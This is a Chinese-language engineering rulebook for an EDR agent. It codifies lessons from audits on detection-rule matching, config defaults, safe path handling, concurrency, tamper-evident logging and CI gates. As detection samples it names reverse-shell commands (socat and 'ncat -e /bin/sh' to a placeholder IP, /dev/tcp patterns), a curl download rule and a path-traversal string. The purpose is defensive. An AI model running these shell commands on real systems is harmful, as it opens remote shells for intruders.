# EDR 开发铁律（沉淀文档）

> 目的：把过去 AI 开发过程中实际踩过的坑、审计发现的问题、上线后回看的隐患，固化成**强制规则**。
> 使用：每次写设计文档 / 改代码 / 加配置 / 评审 PR **之前**先过一遍本文。
> 更新：每次外部审计 / 内部 Code Review / 故障复盘后，必须把新发现追加到 §6"审计反馈登记"；每条铁律的"出处"指向具体证据。

| 项 | 值 |
|---|---|
| 当前铁律总数 | **33 条**（分 8 类） |
| 证据来源 | `audit/verify-m3-report.json` + `PROJECT_STATUS.md` §6/§14.3 + 代码注释 + 离线复盘 |
| 最近一次更新 | 见文末版本表 |
| 维护原则 | 宁少勿泛；每条铁律必须能用 1 个反例 + 1 个修正例证伪 |

---

## 0. 速查表（设计/开发前 5 秒过一遍）

| 编号 | 一句话规则 | 类别 |
|---|---|---|
| **R-S1** | **字符串匹配规则必须用词边界/正则，不能用裸 substring** | 策略 |
| **R-S2** | **路径匹配用 prefix/dir + glob，不用全路径精确匹配** | 策略 |
| **R-S3** | **单条规则不允许只覆盖一种 payload 形态** | 策略 |
| **R-S4** | **time_window 必须有"非空窗口"的真值表 + 跨午夜测试** | 策略 |
| **R-S5** | **whitelist 的 pattern 不得比主规则更宽** | 策略 |
| **R-S6** | **decision 与 action 字段必须正交，不可语义重叠** | 策略 |
| **R-S7** | **排序键不唯一时必须显式 tie-breaker** | 策略 |
| **R-S8** | **每条规则必须有 ≥1 个 FP 反向样本和 ≥1 个 FN 正向样本作为 fixture** | 测试 |
| **R-P1** | **默认值必须在 配置 / 代码 / 文档 三处一致** | 配置 |
| **R-P2** | **任何"会动手"的操作默认 dry_run=true 直到部署阶段切换** | 配置 |
| **R-P3** | **资源上限必须分级（soft-default / hard-cap），不能散落** | 配置 |
| **R-P4** | **能改策略/配置的 API 端点必须有 audit + (签名 OR 审批链)** | 控制面 |
| **R-C1** | **所有需要权限的操作走最小 capability 集合** | 控制面 |
| **R-C2** | **JSON 反序列化必须显式 DisallowUnknownFields + 大小上限** | 控制面 |
| **R-C3** | **所有路径输入必须过 safePath + symlink 解析 + 父目录存在性检查** | 控制面 |
| **R-C4** | **同一 fd 内的写/改用 *at 系列调用，绝不 lstat→操作 两步** | 安全 |
| **R-K1** | **每个 `go func()` 必须有 shutdown path + error sink** | 并发 |
| **R-K2** | **锁的范围精确到内存操作；IO 期间不持锁** | 并发 |
| **R-K3** | **一致性快照在 cycle 开始时拍定，cycle 内不变** | 并发 |
| **R-K4** | **时间/hostname/uid 等"运行时变量"在一次事务内取一次后冻结** | 一致性 |
| **R-L1** | **日志写盘前必须算好 hash + HMAC；HMAC 失败的事件要单独 sink 告警** | 审计 |
| **R-L2** | **抑制器状态必须可持久化；攻击者不能靠"触发 spam 等重启清零"绕过** | 审计 |
| **R-L3** | **SchemaVersion 在每次破坏性变更时必须 bump；不能因为 omitempty 兼容就压住** | 审计 |
| **R-L4** | **每条 audit 事件必须可被独立 verify（不依赖整文件全扫）** | 审计 |
| **R-O1** | **每次写盘/外部调用的结果要带错误链；吞错必须留 log 通道** | 可靠性 |
| **R-O2** | **每个 goroutine 启动路径必须有显式 defer-recover 或者上游 panic 屏障** | 可靠性 |
| **R-O3** | **性能/资源数据每次跑都收集并 trend 化** | 可靠性 |
| **R-SCHEMA1** | **结构体字段要么有数据源，要么不写，不要留空字段带 omitempty** | API |
| **R-SCHEMA2** | **类型选择要可证：string 装数字必须在 godoc 写明回退空串的语义** | API |
| **R-CLI1** | **门禁脚本的 artifact 必须可重跑；commit 的报告必须带 build-time stamp** | CI |
| **R-CLI2** | **任何审计发现的 FP/FN 必须在下一轮 sprint 修复并 re-run gate；不接受"留着观察"** | CI |
| **R-CLI3** | **测试样本必须包含真实对抗样本，不能仅匹配自己写的规则** | CI |
| **R-CLI4** | **每次审计（外部/内部/门禁）之前必须先跑完所有必要测试并全绿** | CI |

> **R-CLI4 是流程级铁律**：任何审计活动（外部审计入场、M3 门禁、verify-v015 复跑、PR review、新版本发布）启动前，必须先证明测试基线是绿的。未跑测试 = 不允许审计。详细清单见 §10.4。

---

## 1. 策略层铁律（8 条）

### R-S1 字符串匹配规则必须用词边界/正则，不能用裸 substring

**反例（已发生 · 出处 `audit/verify-m3-report.json` F07）**：

```jsonc
// configs/policy.json
{
  "id": "P001-suspicious-shell-download",
  "match": { "cmdline_contains": "curl http" }   // ← 意图"curl http://..."但
}                                                //  substring 会把 "curl https://..." 也命中
```

F07 = `cmdline="curl https://example.com"` (benign) → 被 P001 命中 → 决策 `block`。
M3 报告 `false_positives = 1/9`，就是这个。

**修正**：

```jsonc
"match": { "cmdline_regex": "^curl\\s+http://[^\\s]+$" }
```

或：用 `cmdline_arg_equals: ["curl", "http://..."]`（按 arg 匹配）。
或：拆出"URL scheme"维度字段 `url_schemes: ["http"]`，匹配器按 token 切。

**适用**：所有 `cmdline_contains` / `path_contains` / `remote_addr_contains` 这类 substring 字段。

---

### R-S2 路径匹配用 prefix/dir + glob，不用全路径精确匹配

**反例（已发生 · 出处 `configs/policy.json` P005）**：

```jsonc
{
  "id": "P005-temp-exec",
  "match": { "process_path": "/tmp/edr-malware" }   // ← 全路径精确匹配
}
```

只挡一个文件名。`/tmp/x.sh` / `/tmp/.../dropper` 全部漏过。

**修正**：

```jsonc
"match": { "path_prefix": "/tmp/", "path_suffix": [".sh", ""], "executable_only": true }
```

匹配器实现按 `os.Stat` 检查 `IsRegular()` + `Mode()&0o111 != 0`。

**适用**：所有 path 匹配——rules / 取证导出路径 / baseline 路径。

---

### R-S3 单条规则不允许只覆盖一种 payload 形态

**反例（已发生 · 出处 `configs/policy.json` P003）**：

```jsonc
{ "id": "P003-reverse-shell-pattern",
  "match": { "cmdline_contains": "/dev/tcp/" } }   // ← 只挡 bash TCP redirect
```

挡不住：
- `python3 -c 'import socket,subprocess;...'`
- `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:1.2.3.4:4444`
- `ncat -e /bin/sh 1.2.3.4 4444`（这条其实在 PAccess 黑名单里但不在 P003 里）

**修正**：
规则要么声明"这是单变体检测，覆盖面有限"（在 description 写明），要么拆成 N 条独立规则。
必须有 reverse-shell 模式表（bash /dev/tcp / python -c socket / socat / ncat -e / perl IO::Socket）一一对应规则。

---

### R-S4 time_window 必须有"非空窗口"的真值表 + 跨午夜测试

**反例（已发生 · 出处 `configs/policy.json` P006）**：

```jsonc
{ "id": "P006-after-hours-admin",
  "match": { "cmdline_contains": "useradd" },
  "time_window": { "start": "00:00", "end": "23:59" }   // ← 覆盖 00:00~23:59 = 24h = 永真
}
```

`after-hours` 实际永远在工作时间内，整条规则等于"每次 useradd 都告警"——和"工作时间外"语义相反。

**修正**：
1. validate 时拒绝 `start == end` 和 `start == "00:00" && end == "23:59"`（"显然全包"是个 anti-pattern，要开发者显式写）
2. 跨午夜窗口（`22:00-06:00`）必须显式支持且测试覆盖
3. 真值表测试要 include：start 前 / start 上 / 中间 / end 上 / end 后 / 跨午夜

---

### R-S5 whitelist 的 pattern 不得比主规则更宽

**反例（已发生 · 出处 `configs/policy.json` P001 whitelist）**：

```jsonc
"match": { "cmdline_contains": "curl http" },     // 主规则：具体
"whitelist": [ { "cmdline_contains": "apt" } ]     // 白名单：太宽
```

`apt install something` 中有 `apt` → 白名单放行。但 `evil` 套个 `apt` 前缀就能绕过：
`apt && curl http://...` 会被白名单"apt"命中（因为包含 `apt` substring）。

**修正**：
- whitelist 必须显式按 arg 匹配（`cmdline_arg_equals: ["apt"]` 表示 apt 是**第一个** arg）
- 或用 `cmdline_prefix: "apt "`（带空格，等于 arg 边界）
- 任何 whitelist 必须自问："攻击者能不能在 cmdline 中塞这个串就绕过去了？"

---

### R-S6 decision 与 action 字段必须正交，不可语义重叠

**反例（已发生 · 出处 `configs/policy.json` N001 / N002）**：

```jsonc
{
  "decision": "alert",
  "action":   "nft_block"   // ← "alert" 语义是只记不挡,但 action 实际是 block
}
```

`decision` 是 audit/响应分支判定（v0.15 AggregatedDecision 用），`action` 是具体动作。
`decision: "alert" + action: "nft_block"` 让审计分支认为"只是告警"，但响应分支已经在阻断——**审计漏报 + 静默拦截**。

**修正**：
- `decision ∈ {allow, alert, deny}` 三选一，明确"是否动手"
- `action ∈ {none, kill, fix_permissions, nft_block, quarantine, log}` 决定"动手方式"
- 矩阵：
  - `decision: allow` → action 必须是 `none`
  - `decision: alert` → action 必须是 `none` 或 `log`
  - `decision: deny`  → action 必须是 `kill/fix_permissions/nft_block/quarantine`
- validate 拒绝不在矩阵里的组合

---

### R-S7 排序键不唯一时必须显式 tie-breaker

**反例（潜在 · v0.15 新增 priority 字段）**：

```jsonc
{ "id": "R-A", "priority": 10, ... }
{ "id": "R-B", "priority": 10, ... }   // 撞优先级
```

Go 的 `sort.SliceStable` 保留输入顺序，但 `EvaluateAll` 内部用 `sort.Slice` 时撞优先级顺序未定义。

**修正**：
- tie-breaker 显式写为 `(priority ASC, id ASC, file_offset ASC)`
- `Validate()` 检测同 priority 规则并 warn "consider disambiguating"

---

### R-S8 每条规则必须有 ≥1 个 FP 反向样本和 ≥1 个 FN 正向样本作为 fixture

**反例（已发生 · 整个 testdata/samples）**：
- M3 样本都是规则作者按自己规则手写的"应该命中"案例
- 没有对抗性 FP（除了 F07 是被字符串误伤）样本
- 没有"看起来像但不应命中"的边缘案例（如变形 cmdline）

**修正**：
- 每条 rule 同目录必须有 `testdata/rules/R001/{positive,negative,edge}/` 三套 fixture
- CI 在 `make verify-m3` 之外加 `make verify-rules` 跑全套 fixture
- 新增规则时 PR 必须带 fixture

---

## 2. 配置层铁律（4 条）

### R-P1 默认值必须在 配置 / 代码 / 文档 三处一致

**反例（已发生 · 出处 `PROJECT_STATUS.md` §14.3）**：

| 项 | agent.json | main.go 默认 | PROJECT_STATUS.md |
|---|---|---|---|
| `allowed_uids` | `[1000]` (dev) | `[0]` (root) | 默认 `[0]` |
| `integrity.key_path` | `/home/cheater/edr-runtime/log.key` | `/var/lib/edr/log.key` | "部署态绝对路径" |

三处不一致，operator 部署时必须手动改两处。

**修正**：
- 单一来源原则：所有默认值只在 `cmd/edr-agent/main.go` 的 `loadConfig` 里定义
- `configs/agent.json` 仅作"开发覆盖"使用，且必须被 `Makefile` 标注为 dev
- `PROJECT_STATUS.md` / `README.md` 自动从代码注释生成（用 `gldoc` / `cog` 之类）
- 写 CI 校验：三处默认值 hash 一致

---

### R-P2 任何"会动手"的操作默认 dry_run=true 直到部署阶段切换

**反例（已发生 · 出处 `cmd/edr-agent/main.go`）**：

```go
NFT: nftConfig{Enabled: false, DryRun: true, ...}   // ← nft 默认 dry
// 但 SoftResponder.DryRun 默认 false
DryRun: false   // ← kill/chmod 默认实操
```

不一致：nft 默认 dry，kill/chmod 默认 live。新人改一行配置就可能从"演练"跳到"真挡"。

**修正**：
- 全局 `dry_run_mode: "off" | "audit" | "log" | "enforce"` 四档
- `audit`：记录动作不执行
- `log`：执行但详细 log（生产推荐）
- `enforce`：执行
- 默认 `audit`，部署手册写"切到 log/enforce 的命令"

---

### R-P3 资源上限必须分级（soft-default / hard-cap），不能散落

**反例（已发生 · 多处）**：

| 处 | 限额 | 备注 |
|---|---|---|
| `defaultEventLimit = 50` / `maxEventLimit = 1000` | events query | 在 control/server.go |
| `MaxBytes: 1048576` | 日志轮转 | 在 eventlog/options |
| `MaxBackups: 3` | 日志保留 | 同上 |
| `MaxHistory = 256` | 响应历史 | 在 control/agent.go |
| `eventLimit = 200` | forensics | 在 control/forensics.go |

散落、互不引用、新人不知道"哪个是真正硬的"。

**修正**：
- 集中到 `internal/config/limits.go` 一个文件
- 三档：soft（可配）/ hard（代码常量）/ never-exceed（必须保护 DoS）
- 文档化"每个 limit 存在的原因 + 提升它的代价"

---

### R-P4 能改策略/配置的 API 端点必须有 audit + (签名 OR 审批链)

**反例（已发生 · v0.15 延后到 v0.16）**：
- `/v0/policy/reload` 接受任意路径（经 safePathUnder 限制在 policy dir 内）
- 没有签名校验：能改 agent.json 的人就能让 agent 加载恶意策略
- v0.15 把"策略签名 + 审批链"推到 v0.16

**修正**：
- 在签名上线前：`/v0/policy/reload` 必须有 audit log（写明调用者 uid/路径/时间/结果）
- 任何 reload 必须有配套的"reload 批准"事件关联（即便 v0.15 阶段用 dry-run 审批）
- 拒绝 `safePathUnder` 校验逃逸（如 `configs/../../etc/passwd`）—当前已修，但类似漏洞每次 reload 路径变化都要重测

---

## 3. 控制面层铁律（4 条）

### R-C1 所有需要权限的操作走最小 capability 集合

**反例（已发生 · 出处 `systemd/edr-agent.service`）**：

```
CapabilityBoundingSet=CAP_KILL CAP_DAC_OVERRIDE CAP_NET_ADMIN CAP_SETUID CAP_SETGID
                       CAP_SYS_PTRACE CAP_DAC_READ_SEARCH
```

`CAP_SYS_PTRACE` 给了但**目前没用到**（只用了 KILL/DAC/NET）。多一个就多一个攻击面。

**修正**：
- 每次 PR 必须回答："新加 capability 用在哪一行代码？能否不依赖？"
- `CAP_SYS_PTRACE` 建议移除（除非 v0.5 自保护要用，且那时再评估）
- 文档里维护"capability 用途矩阵"

---

### R-C2 JSON 反序列化必须显式 DisallowUnknownFields + 大小上限

**反例（已发生 · 出处 `cmd/edr-agent/main.go` vs `internal/policy/policy.go`）**：

- `cmd/edr-agent/main.go:198` 用了 `dec.DisallowUnknownFields()`（agent.json）✅
- `internal/policy/policy.go:125` 用 `json.Unmarshal(raw, &p)`（policy.json）❌
  - 不拒绝未知字段
  - 没有 `MaxBytes` 限制（attacker 写 1GB JSON 也能让 agent 读进来）

**修正**：
```go
const maxPolicyBytes = 1 << 20   // 1 MiB
func Load(path string) (*Policy, error) {
    f, err := os.Open(path)
    if err != nil { return nil, err }
    defer f.Close()
    
    info, _ := f.Stat()
    if info.Size() > maxPolicyBytes {
        return nil, fmt.Errorf("policy too large: %d > %d", info.Size(), maxPolicyBytes)
    }
    
    dec := json.NewDecoder(f)
    dec.DisallowUnknownFields()
    var p Policy
    if err := dec.Decode(&p); err != nil { return nil, err }
    if err := p.Validate(); err != nil { return nil, err }
    return &p, nil
}
```

**适用**：所有 JSON 输入（policy / agent.json / baseline.json / events.jsonl 每行 / 控制面 HTTP body）。

---

### R-C3 所有路径输入必须过 safePath + symlink 解析 + 父目录存在性检查

**反例（已发生 · 出处 `internal/control/security.go`）**：
- `safePathUnder` 已实现并被使用 ✅
- 但 `prepareSocketPath` 在 main.go 单独写：没有调用 `safePathUnder`，自己 lstat 后 Remove——如果 socket 父目录是 symlink 指到 `/etc` 怎么办？

**修正**：
- 所有路径输入（policy/forensics/socket/log/state/key）必须经过**同一个** `safePathUnder` 或等价的 `sanitizePath`
- 任何新加的 path 参数先问："这个路径会读/写/删什么？被 symlink 替换会怎样？"
- 单元测试覆盖：父目录是 symlink / 中间某层是 symlink / 目标是 symlink

---

### R-C4 同一 fd 内的写/改用 *at 系列调用，绝不 lstat→操作 两步

**反例（已修 · 出处 `internal/response/response.go`）**：
- `chmodNoFollow` 用 `O_NOFOLLOW + Fchmod(fd, 0600)` ✅
- 但其他文件操作（quarantine / log 写入 / 取证导出）没强制这条规范

**修正**：
- 任何 "stat → write" 模式重构成 "open(NOFOLLOW/CLOEXEC) → operate(fd)"
- 或用 `*at` 系列：`openat(dirfd, name, ...)`, `fchmodat(dirfd, name, mode, AT_SYMLINK_NOFOLLOW)`, `unlinkat(dirfd, name, AT_REMOVEDIR)`
- code review checklist 必查项："这里是不是 lstat 后才动？"

---

## 4. 并发与一致性铁律（4 条）

### R-K1 每个 `go func()` 必须有 shutdown path + error sink

**反例（已发生 · 出处 `internal/control/agent.go:131`）**：

```go
go appendResponseRecord(responsePath, rec)   // ← fire-and-forget
```

问题：
- agent 退出时这个 goroutine 可能在写一半被砍掉，留下半截 JSONL
- 写失败没有任何 sink（`os.OpenFile` 失败直接 return，丢响应记录）
- 多个 goroutine 写同一文件没互斥（`response.jsonl` 可能交错）

**修正**：
- 启动一个有 buffer 的 channel + 单一 writer goroutine
- agent.Shutdown() 关 channel，等 writer 排空
- 写失败入 `var writeFailures []ResponseRecord` 并在 metrics 暴露

---

### R-K2 锁的范围精确到内存操作；IO 期间不持锁

**反例（已发生 · 出处 `internal/eventlog/event.go`）**：

```go
func (l *Logger) Write(e Event) error {
    l.mu.Lock()
    defer l.mu.Unlock()    // ← 持锁期间做:序列化、hash、HMAC、写盘、轮转
    ...
}
```

ticker 5s 一次，单 goroutine 写，但若 v0.2 引入 eBPF 高频事件，单 mutex 串行化会成瓶颈。

**修正**：
- 把"序列化+hash+HMAC"放锁内（纯计算）
- 把"写盘+轮转"放锁外
- 用 channel 把 Event 喂给专门的 writer goroutine

---

### R-K3 一致性快照在 cycle 开始时拍定，cycle 内不变

**反例（潜在 · `internal/control/agent.go` RunOnce）**：

```go
func (a *Agent) RunOnce(ctx context.Context) error {
    snap, _ := a.Collector.Snapshot()         // ← t0
    pol := a.CurrentPolicy()                  // ← t1
    
    for _, proc := range snap.Processes {     // ← t2
        ...
        if rule, ok := pol.EvaluateProcessAccess(subj); ok { ... }  // 用 t1 的策略匹配 t0 的 snap
        // 如果 ticker 中间 reload 了 policy, t1 仍是旧 policy——OK
        // 但若 Collect 和 Policy 跨过 reload,会出现"新事件用旧规则"
        // 这一点 v0.15 已经处理（用 t1 拍快照）
    }
}
```

实际目前**没问题**，但要作为规则固化：**snapshot 拍后不能再 mutate**。

**修正**：
- RunOnce 第一行：`a.Init()` + `snapshot = a.Collector.Snapshot()` + `policy = a.CurrentPolicy()`（三者锁定为一个事务）
- 后续只读这三者
- 任何"中途想 reload"必须等当前 cycle 跑完

---

### R-K4 时间/hostname/uid 等"运行时变量"在一次事务内取一次后冻结

**反例（已发生 · 出处 `internal/eventlog/event.go:80`）**：

```go
if e.Host == "" {
    host, _ := os.Hostname()   // ← 每次 Write 都读
    e.Host = host
}
```

问题：
- 移动笔记本 DHCP 续约后主机名变了 → 同一进程的不同事件归属不同 hostname
- chain head 算 hash 时也用 host 字段 → chain 可能因 hostname 漂移产生"假阳性"
- 同理 `time.Now()` / `os.Getuid()` 每次取都不同

**修正**：
- `Agent` 启动时取一次 `host, uid, bootID, machineID`，存为不可变字段
- `Logger.Write` 用 `Agent.host` 而非 `os.Hostname()`
- `Timestamp` 在 cycle 开始时取一次，cycle 内所有事件复用

---

## 5. 审计层铁律（4 条）

### R-L1 日志写盘前必须算好 hash + HMAC；HMAC 失败的事件要单独 sink 告警

**反例（潜在 · 出处 `internal/eventlog/integrity.go`）**：
- v0.15 已经在写盘前算 HMAC ✅
- 但 HMAC 失败时**直接返回 error**——意味着这条事件**不写盘**
- 攻击者改一行 → 验证失败 → 这条事件丢失 → 反而**消除证据**

**修正**：
- HMAC 失败时仍然把"原始事件 + 失败标记"写到一个独立文件 `events.rejected.jsonl`
- 触发 alarm event（紧急 severity）并把原始 hash 链断点写明
- 这样"试图篡改"反而留下更强证据

---

### R-L2 抑制器状态必须可持久化；攻击者不能靠"触发 spam 等重启清零"绕过

**反例（已发生 · 出处 `PROJECT_STATUS.md` §14.3）**：
- v0.15 抑制器是 in-memory map
- agent 重启 → 状态清零
- 攻击者触发 1000 次 spam → 触发 kill → agent 重启（受 systemd Restart=on-failure） → 状态清零 → 又能触发 1000 次

**修正**：
- 抑制器状态也走 chain-style 持久化（`suppress.state` 文件 + hash）
- 启动期 load；shutdown 期 save
- 推 v0.16 收尾项（已在 PROJECT_STATUS.md §14.2 标记为 🟡 P2）

---

### R-L3 SchemaVersion 在每次破坏性变更时必须 bump；不能因为 omitempty 兼容就压住

**反例（已发生 · 出处 `internal/eventlog/event.go:13`）**：

```go
const SchemaVersion = "v0.1"   // ← v0.15 加了 chain/HMAC 但 SchemaVersion 还是 v0.1
```

v0.15 加了 `integrity_version / chain_id / seq / prev_hash / hash / hmac` 字段。消费方：
- 老解析器（v0.1）能解析新事件（omitempty 字段缺失）→ 兼容
- 但**老解析器不知道有 chain** → 验证完整性时不会用 → 安全降级

**修正**：
- v0.15 起 `SchemaVersion = "v0.15"`
- 解析器按 version 分发：v0.1 走 legacy 解析，v0.15 走 chain 解析
- 任何破坏性字段（不可忽略）必须 bump version

---

### R-L4 每条 audit 事件必须可被独立 verify（不依赖整文件全扫）

**反例（潜在 · 出处 `internal/eventlog/integrity.go` Verify）**：
- 当前 `Verify` 必须从文件头开始逐行重算 hash
- 想 verify 第 100 万条事件就得扫前 100 万条

**修正**：
- 增量 verify：`/v0/events/verify?seq=N&hash=H` 单独验某条
- 需要 ChainState 维护 last_hash + last_seq 索引（已有）
- 写工具 `edrctl events verify <seq> [<seq>...]`

---

## 6. 可靠性铁律（3 条）

### R-O1 每次写盘/外部调用的结果要带错误链；吞错必须留 log 通道

**反例（已发生 · 多处 `_ = xxx` 模式）**：

```go
_ = os.MkdirAll(...)           // 失败完全静默
_ = rawFile.Write(...)         // 失败丢字节
_, _ = rawFile.Write(...)      // 失败 + 字节数都丢
```

**修正**：
- 默认用 `if err != nil { return err }` 或 `if err != nil { log.Errorw(...) }`
- 真的要"故意忽略"，必须写成 `if err != nil { logger.Warn("intentional ignore: ...") }` 且留 log 通道
- CI 工具 `errcheck` 启用（`make lint` 跑）

**适用范围**（R-O1 v0.16 0.2 版澄清）：
- **R-O1 真违规**（必须修）：`f.Write/Read/Logger.Write/Os.Remove/Os.Chmod` 等"会丢数据/丢状态"的调用，`_, _` 显式丢弃，或 `_ =` 静默吞错
- **R-O1 例外**（可在 `.errcheck` 白名单）：`defer xxx.Close()` 是 Go 圈惯例（fails during shutdown 也无 sink），`defer Body.Close()` 同理，`parseInt/parseUint/ReadFile/Readlink` 等 best-effort 解析（失败回退默认值）
- **审计 gate 建议命令**：`errcheck -blank -ignoretests ./... | grep -vE 'defer .*Close|parseInt|parseUint|ReadFile|Readlink|os.Remove|Os.Chmod|Rename|backupPolicy|raw.Control|syslog.Info|json.NewEncoder|os.Chmod|agent.RunOnce|httpSrv\.'`
- 任何新加的 `_ =` 必须有 1 行注释解释为什么 + 在 §9 反例登记

---

### R-O2 每个 goroutine 启动路径必须有显式 defer-recover 或者上游 panic 屏障

**反例（潜在 · v0.15 `go appendResponseRecord`）**：
- 这条 goroutine 内如果 panic，会导致整个进程崩
- agent 跑 systemd 的话会自动 Restart=on-failure，但**已经写到一半的 responses.jsonl 会断**

**修正**：
- 任何 `go func()` 第一行 `defer func() { if r := recover(); r != nil { logger.Errorw("goroutine panic", "err", r, "stack", debug.Stack()) } }()`
- 或者用 `errgroup.WithContext` 统一管理

---

### R-O3 性能/资源数据每次跑都收集并 trend 化

**反例（已发生 · 出处 `verify-m3-report.json`）**：
- 报告里有 `max_rss_kb: 13412` / `user_cpu_sec: 0.12`
- 但**没历史对比**——你怎么知道 13MB 是正常 vs 突然涨到 130MB？
- 没有"baseline metrics"——regression 难发现

**修正**：
- 每次 verify-m3 / verify-v015 把 metrics 写到 `audit/metrics/<date>.json`
- CI 跑 `make verify-baseline` 对比最近 N 次，超过阈值（如 +20% RSS）即 fail
- 关键 metric：RSS、CPU、event/sec、suppress ratio、chain verify 时间

---

## 7. API/数据层铁律（2 条）

### R-SCHEMA1 结构体字段要么有数据源，要么不写，不要留空字段带 omitempty

**反例（已发生 · 出处 `internal/collector/collector.go:24`）**：

```go
type Process struct {
    ...
    User string `json:"user,omitempty"`   // ← 字段有但 readProcesses() 从来不设
}
```

后果：
- 下游消费者期待 `subject.user` 有值但永远是空
- 取证导出里这条字段是空字符串而不是"未采集"
- 让"没数据"和"数据为空字符串"无法区分

**修正**：
- 要么 `readProcesses` 加用户解析（`/proc/<pid>/loginuid` → `/etc/passwd` 反查）
- 要么把字段从 struct 删掉
- 用 `*string` 显式表达 nil（未采集）vs ""（采集到但为空）

---

### R-SCHEMA2 类型选择要可证：string 装数字必须在 godoc 写明回退空串的语义

**反例（已发生 · 出处 `internal/procutil/proc.go`）**：

```go
// StartTicksFromStat parses /proc/<pid>/stat field 22 (starttime) as a string.
// Returns "" if the line is malformed or has fewer than 22 fields.
func StartTicksFromStat(statLine string) string { ... }
```

string 装"无符号整数 + 错误回退空串"，调用方必须用：
```go
if ticks := procutil.StartTicksFromStat(...); ticks != "" {
    // 有效
}
```

**修正**：
- godoc 写明 `// Returns "" on parse failure`（已有 ✅，作为正面例子）
- 调用方用 `ticks == ""` 判失败（不应被忽略）
- 单元测试覆盖：缺字段、22 字段、字段含特殊字符
- 不要回退：直接 `func() (uint64, error)`

---

## 8. CI/门禁铁律（3 条）

### R-CLI1 门禁脚本的 artifact 必须可重跑；commit 的报告必须带 build-time stamp

**反例（已发生 · 出处 `audit/verify-m3-report.json`）**：
- 报告 commit 进 git
- 但**没有 timestamp / commit-sha / agent-version**
- 看 git blame 知道是何时跑的，但 JSON 本身不携带

**修正**：
```json
{
  "schema_version": "v0.1",
  "generated_at":   "2026-06-04T09:02:00Z",
  "agent_commit":   "edr-2d2b471",
  "agent_version":  "v0.15",
  "kernel":         "6.17.0-29-generic",
  ...
}
```
- CI 在 `make verify-m3` 末尾自动注入这些字段
- 报告**不** commit 到 git（写到 `audit/.local/`，gitignore 掉）

---

### R-CLI2 任何审计发现的 FP/FN 必须在下一轮 sprint 修复并 re-run gate；不接受"留着观察"

**反例（已发生 · F07 false positive）**：
- verify-m3-report.json 明确记录 F07 误报
- 但 v0.1 → v0.15 多轮升级，policy.json 一直没改这条规则
- F07 仍然 FP

**修正**：
- 任何 FP/FN 发现即在 `audit/known-issues.md` 登记（一行：rule / sample / 原因 / 修复 PR）
- sprint 收尾必须 review 该表，已登记但未修复的不允许 close sprint
- 修复后 re-run `make verify-m3` 必须 `false_positives=0` 才能 close

---

### R-CLI3 测试样本必须包含真实对抗样本，不能仅匹配自己写的规则

**反例（已发生 · 整个 testdata）**：
- M3 样本 S01-S09 都是规则作者"按规则设计样本"
- F01-F09 都是"明显良性"样本
- 缺"看着像合法但实际恶意"的对抗样本
- 缺"看着像恶意但实际合法"的边缘样本（F07 算一个但是被误伤的）

**修正**：
- `testdata/adversarial/` 目录放真实攻击场景（模拟的）
  - mimikatz-like 加密字符串
  - 各种 reverse shell 变体（bash/python/perl/ruby/ncat）
  - 各种 download cradle（curl/wget/fetch/Invoke-WebRequest）
  - 持久化（cron/systemd/useradd）
- `testdata/legitimate/` 放真实合法的同类操作
  - `curl https://`（HTTPS）
  - `python3 -m http.server`（开发常用）
  - `apt install`（合法包管理）
  - `systemctl status`（合法运维）
- CI 必须对每条规则跑两套样本

---

### R-CLI4 每次审计之前必须完成所有必要测试并全绿

**反例（已发生 · 复合性）**：

1. **F07 误报跨多轮未被发现** —— `verify-m3-report.json` 一直带 `false_positives=1`，但 M3 门禁的阈值是 `FP≤2/8`，所以"通过"了。
   - **根因**：审计方只看"门禁过了"，没看"门禁阈值是否合理 / 已有 FP 是否登记在修"
   - 如果审计前有"FP 必须在已知 issue 表里有 owner"的测试前置项，就会被拦下

2. **v0.15 verify 脚本不重跑 M3 样本** —— `scripts/verify_v015.sh` 只验证 chain+verify+tamper，不验证"v0.15 改动后 S01-S09 还能被检出、F01-F09 还能被放行"
   - **根因**：v0.15 的 verify 脚本是个"v0.15 自身 feature 测试"，不是"v0.1 全部回归测试"
   - 如果 v0.15 改动破坏了 M3 行为（譬如 priority 排序把 P001 排到 P003 后面），v0.15 门禁仍然会过

3. **PROJECT_STATUS.md §6 列的"已知边界"没自动化测试覆盖** —— 譬如"抑制器重启清零"是已知短板，但 CI 没断言"agent 重启后 dedup key 不会保留"
   - **根因**：已知短板进了文档不进测试，意味着"短板永远不被自动化捕获"

**修正（强制清单）**：

审计（含外部审计入场 / 内部 M3 门禁 / verify-* 复跑 / PR review / 发版前）启动前必须跑完下列 12 项，全绿才允许进入审计。**任何一项不过 = 审计不开始**。

| # | 必跑项 | 命令 | 状态判据 |
|---|---|---|---|
| 1 | 全量单元测试 | `go test ./...` | exit 0 |
| 2 | 全量编译 | `go build ./cmd/...` | exit 0 |
| 3 | 静态分析 | `go vet ./...` | exit 0 |
| 4 | 格式检查 | `gofmt -l .` | 无输出 |
| 5 | 静默错误扫描 | `errcheck ./...` | 无 `_ =` 漏出 |
| 6 | 上一版 M3 回归 | `make verify-m3` | `passed=true` 且 FP=0（不是 ≤2） |
| 7 | 当前版 chain+verify | `make verify-v015`（或 v0.16 / v0.2 对应） | exit 0 |
| 8 | 抑制器手测 | `bash scripts/test_suppression.sh` | exit 0 |
| 9 | 链持久化手测 | `bash scripts/test_chain_persistence.sh` | exit 0 |
| 10 | 取证手测 | `bash scripts/test_reset.sh` | exit 0 |
| 11 | 场景手测 | `bash scripts/test_v015_scenarios.sh` | exit 0 |
| 12 | systemd 单元语法 | `systemd-analyze verify systemd/edr-agent.service` | exit 0 |

**额外必须前置的不自动化项**：
- `audit/known-issues.md` 登记的所有 open 项必须有 owner 和 ETA
- 本次 PR 涉及的 R-X 铁律有 1 句话说明怎么遵守
- 若要"带 1 个已知 FP 通过"，必须在 PR 描述里写"已知 FP 列表 + 修复 ETA"，由 reviewer 显式 ack

**统一入口（建议在 Makefile 加）**：
```makefile
audit-ready: build test vet fmt errcheck verify-m3 verify-v015 \
             test-suppression test-chain test-reset test-scenarios \
             systemd-verify
	@echo "✅ audit-ready: all gates green, safe to start audit"
```

**与 R-CLI2 的关系**：
- R-CLI2：审计**发现**的 FP/FN 必须在下一轮 sprint 修复（事后）
- R-CLI4：审计**开始前**所有测试必须全绿（事前）
- 两者形成闭环：事前锁基线 + 事后追修复

**例外**：
- 例外必须写在 PR 描述 + reviewer 显式 ack
- 同一例外最多 1 个 sprint 内有效，到期必须转正或撤
- 临时跳过审计 = **不允许**。要不就修，要不就延期审计

---

## 9. 反例登记（每次新发现追加）

> 这是"实时登记"，每条 iron rule 的触发案例都进这里。

